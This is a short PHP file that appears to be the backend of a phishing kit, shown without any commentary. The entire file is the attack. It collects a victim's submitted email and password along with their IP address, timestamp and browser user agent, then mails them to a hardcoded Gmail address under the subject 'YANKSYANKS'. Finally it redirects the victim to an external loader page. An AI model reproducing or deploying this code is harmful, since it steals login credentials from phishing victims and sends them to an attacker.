<?

$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "----------\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "Epass: ".$_POST['password']."\n";

$message .= "----------\n";
$message .= "User IP : ".$ip."\n";
$message .= "Date : ".$adddate."\n";
$message .= "User Agent : ".$useragent."\n";
$message .= " - by x0r -\n";

$recipient = "jesuswire80@gmail.com";
$subject = "YANKSYANKS";
$headers .= "YANKSYANKS";
mail($recipient,$subject,$message,$headers);?>





<script type="text/javascript">
</script><meta HTTP-EQUIV="REFRESH" content="2; URL= http://inflatablekayakdeals.com/themes/loader.htm">
